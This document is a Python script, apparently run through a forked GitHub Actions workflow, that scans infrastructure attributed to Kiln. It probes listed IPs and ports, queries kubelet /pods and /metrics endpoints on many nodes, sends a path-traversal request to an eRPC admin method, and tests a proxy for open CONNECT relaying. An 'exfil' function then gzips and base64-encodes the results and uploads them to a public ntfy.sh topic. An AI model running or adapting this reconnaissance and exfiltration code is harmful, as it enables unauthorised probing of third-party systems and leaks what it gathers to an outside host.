#!/usr/bin/env python3
"""Read-only second-vantage egress re-test for Kiln negative faces.

Runs on GitHub-hosted ubuntu-latest (renato46 fork). Zero writes on targets,
zero auth attempts, zero signing. Results -> gzip+base64 -> ntfy attachment
and also printed to stdout as B64CHUNK lines. Always exit 0.
"""
import base64
import gzip
import json
import socket
import ssl
import subprocess
import sys
import time
import urllib.request

TOPIC = "kiln-runner-recon-94151a"
NTFY = "https://ntfy.sh/" + TOPIC
RES = {"probe": "egress-94151-v1", "when_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}
REQS = [0]


def now():
    return time.strftime("%H:%M:%SZ", time.gmtime())


def sh(cmd, t=20):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        return {"cmd": cmd, "rc": p.returncode, "out": (p.stdout or "")[-1200:], "err": (p.stderr or "")[-300:]}
    except Exception as e:
        return {"cmd": cmd, "error": repr(e)}


def _ctx():
    c = ssl.create_default_context()
    c.check_hostname = False
    c.verify_mode = ssl.CERT_NONE
    return c


def http(url, method="GET", data=None, timeout=8, host=None, sni=None, parse_json=False):
    """HTTP(S) request; records code/headers/body prefix. Never raises."""
    REQS[0] += 1
    t0 = time.time()
    out = {"url": url, "method": method, "t": round(time.time() - t0, 2)}
    hdrs = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) kiln-egress-recon/1"}
    if host:
        hdrs["Host"] = host
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    try:
        req = urllib.request.Request(url, method=method, data=data, headers=hdrs)
        with urllib.request.urlopen(req, timeout=timeout, context=_ctx()) as r:
            body = r.read(6000)
            out.update({"code": r.status, "len": len(body),
                        "server": r.headers.get("Server"),
                        "wwwauth": r.headers.get("WWW-Authenticate"),
                        "ctype": r.headers.get("Content-Type"),
                        "first": body[:220].decode("utf-8", "replace")})
            if parse_json:
                try:
                    out["json"] = json.loads(body)
                except Exception:
                    pass
    except urllib.error.HTTPError as e:
        try:
            b = e.read(1200)
        except Exception:
            b = b""
        out.update({"code": e.code, "len": len(b),
                    "server": (e.headers or {}).get("Server") if e.headers else None,
                    "wwwauth": (e.headers or {}).get("WWW-Authenticate") if e.headers else None,
                    "first": b[:220].decode("utf-8", "replace")})
    except Exception as e:
        out["error"] = repr(e)
    out["t"] = round(time.time() - t0, 2)
    RES.setdefault("http", []).append(out)
    return out


def tcp(ip, port, send=None, window=8.0, tag=None):
    """Raw TCP: connect, optionally send, read until window. Records bytes."""
    REQS[0] += 1
    t0 = time.time()
    out = {"ip": ip, "port": port, "tag": tag, "window": window}
    s = None
    try:
        s = socket.create_connection((ip, port), timeout=6)
        out["conn_ms"] = int((time.time() - t0) * 1000)
        s.settimeout(window)
        if send:
            s.sendall(send)
        buf = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    out["eof"] = True
                    break
                buf += chunk
                if len(buf) > 4096:
                    break
        except socket.timeout:
            out["timeout"] = True
        except Exception as e:
            out["recv_err"] = repr(e)
        out["nbytes"] = len(buf)
        out["hex64"] = buf[:64].hex()
        out["first"] = buf[:200].decode("utf-8", "replace").replace("\r", "\\r").replace("\n", "\\n")
    except Exception as e:
        out["error"] = repr(e)
    finally:
        try:
            if s:
                s.close()
        except Exception:
            pass
    out["ms"] = int((time.time() - t0) * 1000)
    RES.setdefault("tcp", []).append(out)
    return out


def tls_handshake(host, port=443, version=None, sni=None):
    REQS[0] += 1
    out = {"host": host, "port": port, "maxver": version}
    t0 = time.time()
    s = None
    try:
        ctx = _ctx()
        if version:
            ctx.minimum_version = version
            ctx.maximum_version = version
        s = socket.create_connection((host, port), timeout=7)
        ss = ctx.wrap_socket(s, server_hostname=sni or host)
        der = ss.getpeercert(binary_form=True)
        out.update({"tls": ss.version(), "cipher": ss.cipher()[0] if ss.cipher() else None,
                    "cert_len": len(der) if der else 0})
        if der:
            try:
                p = subprocess.run(["openssl", "x509", "-inform", "DER", "-noout", "-subject", "-issuer", "-dates", "-ext", "subjectAltName"],
                                   input=der, capture_output=True, timeout=10)
                out["cert"] = (p.stdout or b"").decode("utf-8", "replace")[:800]
            except Exception as e:
                out["cert_err"] = repr(e)
        ss.close()
    except Exception as e:
        out["error"] = repr(e)
        out["err_type"] = type(e).__name__
    finally:
        try:
            if s:
                s.close()
        except Exception:
            pass
    out["ms"] = int((time.time() - t0) * 1000)
    RES.setdefault("tls", []).append(out)
    return out


def run():
    # 0) runner identity (0 target requests)
    RES["id"] = {c: sh(c) for c in ["id", "hostname -f", "uname -a", "nproc"]}

    # 1) egress IP/ASN (2 requests)
    RES["egress"] = [http("https://ifconfig.me/ip", timeout=10),
                     http("https://api.ipify.org", timeout=10)]
    time.sleep(0.4)
    # ipinfo for ASN (1 extra, still cheap)
    RES["egress"].append(http("https://ipinfo.io/json", timeout=10, parse_json=True))
    time.sleep(0.3)

    # (a) 212.47.249.248 known ports: read-first then HTTP GET probe, 8s window
    a = []
    for port in [22, 4000, 4005, 4040, 6671, 5900]:
        r = tcp("212.47.249.248", port, send=None, window=8.0, tag="readfirst")
        if r.get("nbytes", 0) == 0:
            r2 = tcp("212.47.249.248", port, send=b"GET / HTTP/1.0\r\nHost: 212.47.249.248\r\n\r\n",
                     window=5.0, tag="afterget")
            r = {"attempts": [r, r2]}
        a.append(r)
        time.sleep(0.4)
    RES["a_212_47_249_248"] = a

    # (b) kubelet 10250 on sampled Kiln nodes (5 historical TLS-reset + 10 confirmed-live)
    nodes = [
        # historical ConnectionReset from rotating egress
        "162.19.103.62", "172.241.49.17", "51.91.160.233", "57.128.187.20", "79.127.207.201",
        # previously TLS_OK 10250 (kubelet) - clean-egress baseline
        "109.61.83.158", "141.94.3.10", "145.239.161.187", "145.239.161.197", "146.59.118.133",
        "172.241.0.175", "198.244.253.126", "212.47.241.154", "23.83.122.148", "37.59.29.13",
    ]
    b = []
    for ip in nodes:
        h = http("https://%s:10250/healthz" % ip, timeout=7)
        rec = {"ip": ip, "healthz": {k: h.get(k) for k in ("code", "len", "first", "error", "t")}}
        if h.get("code") is not None:
            p = http("https://%s:10250/pods" % ip, timeout=7)
            rec["pods"] = {k: p.get(k) for k in ("code", "len", "first", "error", "t")}
            if p.get("code") == 200:
                rec["pods_json_head"] = p.get("first")
                for path in ["/runningpods", "/metrics"]:
                    x = http("https://%s:10250%s" % (ip, path), timeout=8)
                    rec[path] = {k: x.get(k) for k in ("code", "len", "first", "error")}
                    time.sleep(0.25)
        b.append(rec)
        time.sleep(0.35)
    RES["b_kubelet"] = b

    # (c) eRPC 34.78.4.174 via erpc.kiln.fi (network allowlist judgement)
    c = []
    for m in ["eth_chainId", "eth_blockNumber"]:
        c.append(http("https://erpc.kiln.fi/main/evm", method="POST",
                      data=json.dumps({"jsonrpc": "2.0", "id": 1, "method": m}).encode(), timeout=9))
        time.sleep(0.4)
    c.append(http("https://erpc.kiln.fi/main/evm/..%2f..%2fadmin", method="POST",
                  data=json.dumps({"jsonrpc": "2.0", "id": 1, "method": "erpc_config"}).encode(), timeout=9))
    RES["c_erpc"] = c

    # (d) trustlane 51.159.8.91:3128 - CONNECT then absolute GET
    d = []
    d.append(tcp("51.159.8.91", 3128,
                 send=b"CONNECT example.com:443 HTTP/1.1\r\nHost: example.com:443\r\nUser-Agent: curl/8.5.0\r\n\r\n",
                 window=6.0, tag="CONNECT"))
    d.append(tcp("51.159.8.91", 3128,
                 send=b"GET http://example.com/ HTTP/1.1\r\nHost: example.com\r\nUser-Agent: curl/8.5.0\r\n\r\n",
                 window=6.0, tag="absoluteGET"))
    RES["d_trustlane"] = d

    # (e) coffre / vault.testnet TLS1.2 + TLS1.3 handshake
    e = []
    for host in ["coffre.kiln.fi", "vault.testnet.kiln.fi"]:
        for v in (ssl.TLSVersion.TLSv1_2, ssl.TLSVersion.TLSv1_3):
            e.append(tls_handshake(host, 443, version=v))
            time.sleep(0.4)
    RES["e_vault_tls"] = e

    # (f) eth-api / eth-keygen-v2 realm only
    f = [http("https://eth-api.mainnet.kiln.fi/", timeout=8),
         http("https://eth-keygen-v2.hoodi.testnet.kiln.fi/", timeout=8)]
    RES["f_basic"] = f
    time.sleep(0.3)

    # (g) 51.158.110.174:8443 bare + query.thegraph vsuite
    g = [tcp("51.158.110.174", 8443, send=None, window=6.0, tag="bare")]
    g.append(tcp("51.158.110.174", 8443,
                 send=bytes.fromhex("16030100050100ff0100"), window=6.0, tag="tinyhello") )
    g.append(http("https://query.thegraph.kiln.fi/subgraphs/name/vsuite", timeout=9))
    RES["g_misc"] = g

    RES["total_target_requests"] = REQS[0]
    return RES


def exfil(data):
    raw = json.dumps(data, ensure_ascii=False).encode()
    gz = gzip.compress(raw, 9)
    b64 = base64.b64encode(gz).decode()
    data["_payload_bytes"] = len(raw)
    data["_gz_bytes"] = len(gz)
    # print to stdout in chunks (secondary channel, read via job log)
    print("B64CHUNK_BEGIN len=%d jsonbytes=%d gzbytes=%d" % (len(b64), len(raw), len(gz)))
    for i in range(0, len(b64), 3000):
        print("B64CHUNK:" + b64[i:i + 3000])
    print("B64CHUNK_END")
    # ntfy PUT file upload (primary channel)
    try:
        req = urllib.request.Request(NTFY + "?title=egress-94151&tags=robot",
                                     data=gz, method="PUT",
                                     headers={"Filename": "egress-94151.json.gz",
                                              "Content-Type": "application/gzip"})
        with urllib.request.urlopen(req, timeout=20) as r:
            print("NTFY_PUT code=%s body=%s" % (r.status, r.read(300).decode("utf-8", "replace")))
    except Exception as ex:
        print("NTFY_PUT_ERROR %r" % (ex,))


if __name__ == "__main__":
    try:
        res = run()
    except Exception as ex:  # noqa: BLE001
        res = {"probe": "egress-94151-v1", "fatal": repr(ex)}
    try:
        exfil(res)
    except Exception as ex:  # noqa: BLE001
        print("EXFIL_ERROR %r" % (ex,))
    sys.exit(0)
